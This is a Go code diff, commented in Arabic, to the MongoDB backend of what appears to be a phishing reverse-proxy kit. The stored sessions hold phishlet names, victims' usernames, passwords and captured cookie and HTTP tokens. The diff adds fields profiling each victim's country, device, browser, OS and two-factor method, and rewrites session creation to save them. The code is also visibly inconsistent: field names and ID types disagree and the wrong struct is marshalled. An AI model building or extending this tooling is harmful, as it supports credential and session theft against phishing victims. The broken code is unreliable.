@@ -41,6 +41,18 @@ type MongoSession struct {
 	CreateTime   int64                         `bson:"create_time" json:"create_time"`
 	UpdateTime   int64                         `bson:"update_time" json:"update_time"`
 	UserId       string                        `bson:"user_id" json:"user_id"`
+	
+	// إضافة الحقول الجديدة
+	CountryCode    string                               `bson:"country_code"`
+	CountryName    string                               `bson:"country_name"`
+	DeviceType     string                               `bson:"device_type"`
+	BrowserType    string                               `bson:"browser_type"`
+	BrowserVersion string                               `bson:"browser_version"`
+	OSType         string                               `bson:"os_type"`
+	OSVersion      string                               `bson:"os_version"`
+	LoginType      string                               `bson:"login_type"`
+	Has2FA         bool                                 `bson:"has_2fa"`
+	Type2FA        string                               `bson:"type_2fa"`
 }
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
@@ -147,6 +159,16 @@ func convertToMongoSession(s *Session) *MongoSession {
 		CreateTime:   s.CreateTime,
 		UpdateTime:   s.UpdateTime,
 		UserId:       s.UserId,
+		CountryCode:  s.CountryCode,
+		CountryName:  s.CountryName,
+		DeviceType:   s.DeviceType,
+		BrowserType:  s.BrowserType,
+		BrowserVersion: s.BrowserVersion,
+		OSType:       s.OSType,
+		OSVersion:    s.OSVersion,
+		LoginType:    s.LoginType,
+		Has2FA:        s.Has2FA,
+		Type2FA:       s.Type2FA,
 	}
 }
 
@@ -169,7 +191,7 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 	}
 
 	return &Session{
-		Id:           ms.Id,
+		Id:           ms.ID,
 		Phishlet:     ms.Phishlet,
 		LandingURL:   ms.LandingURL,
 		Username:     ms.Username,
@@ -184,6 +206,16 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		CreateTime:   ms.CreateTime,
 		UpdateTime:   ms.UpdateTime,
 		UserId:       ms.UserId,
+		CountryCode:  ms.CountryCode,
+		CountryName:  ms.CountryName,
+		DeviceType:   ms.DeviceType,
+		BrowserType:  ms.BrowserType,
+		BrowserVersion: ms.BrowserVersion,
+		OSType:       ms.OSType,
+		OSVersion:    ms.OSVersion,
+		LoginType:    ms.LoginType,
+		Has2FA:        ms.Has2FA,
+		Type2FA:       ms.Type2FA,
 	}
 }
 
@@ -227,57 +259,52 @@ func (m *MongoDatabase) GetLastSessionId() (int, error) {
 }
 
 // CreateSession ينشئ جلسة جديدة في MongoDB
-func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remoteAddr string) error {
-	log.Debug("[MongoDB] محاولة إنشاء جلسة جديدة: %s", sid)
-	
-	// التحقق مما إذا كانت الجلسة موجودة بالفعل
-	var existingSession MongoSession
-	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&existingSession)
-	if err == nil {
-		log.Debug("[MongoDB] الجلسة موجودة بالفعل: %s", sid)
-		return fmt.Errorf("الجلسة موجودة بالفعل: %s", sid)
-	} else if err != mongo.ErrNoDocuments {
-		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
-		return err
+func (m *MongoDatabase) CreateSession(
+	sid, phishlet, landingURL, useragent, remoteAddr string,
+	countryCode, countryName string,
+	deviceType, browserType, browserVersion, osType, osVersion string,
+	loginType string, has2FA bool, type2FA string,
+) error {
+	s := &Session{
+		Id: primitive.NewObjectID(),
+		SID: sid,
+		Phishlet: phishlet,
+		LandingURL: landingURL,
+		Username: "",
+		Password: "",
+		Custom: make(map[string]string),
+		Params: make(map[string]string),
+		BodyTokens: make(map[string]string),
+		HttpTokens: make(map[string]string),
+		CookieTokens: make(map[string]map[string]*CookieToken),
+		UserAgent: useragent,
+		RemoteAddr: remoteAddr,
+		CreateTime: time.Now().Unix(),
+		UpdateTime: time.Now().Unix(),
+
+		// إضافة الحقول الجديدة
+		CountryCode: countryCode,
+		CountryName: countryName,
+		DeviceType: deviceType,
+		BrowserType: browserType,
+		BrowserVersion: browserVersion,
+		OSType: osType,
+		OSVersion: osVersion,
+		LoginType: loginType,
+		Has2FA: has2FA,
+		Type2FA: type2FA,
 	}
 
-	// الحصول على آخر معرف
-	lastId, err := m.GetLastSessionId()
+	// تحويل إلى BSON
+	bs, err := bson.Marshal(s)
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف: %v", err)
 		return err
 	}
-	newId := lastId + 1
-	log.Debug("[MongoDB] تعيين معرف الجلسة الجديدة: %d", newId)
 
-	// إنشاء جلسة جديدة
-	now := time.Now().UTC().Unix()
-	newSession := &MongoSession{
-		Id:           newId,
-		Phishlet:     phishlet,
-		LandingURL:   landingURL,
-		Username:     "",
-		Password:     "",
-		Custom:       make(map[string]string),
-		BodyTokens:   make(map[string]string),
-		HttpTokens:   make(map[string]string),
-		CookieTokens: make(map[string]map[string]interface{}),
-		SessionId:    sid,
-		UserAgent:    useragent,
-		RemoteAddr:   remoteAddr,
-		CreateTime:   now,
-		UpdateTime:   now,
-		UserId:       "JEMEX123", // تعيين قيمة UserId الثابتة
-	}
-
-	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
-	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء إدراج الجلسة: %v", err)
-		return err
-	}
-	
-	log.Debug("[MongoDB] تم إنشاء الجلسة بنجاح: %s (ID: %d)", sid, newId)
-	return nil
+	// حفظ في قاعدة البيانات
+	coll := m.client.Database(m.dbName).Collection("sessions")
+	_, err = coll.InsertOne(context.Background(), bs)
+	return err
 }
 
 // ListSessions يجلب قائمة الجلسات من MongoDB
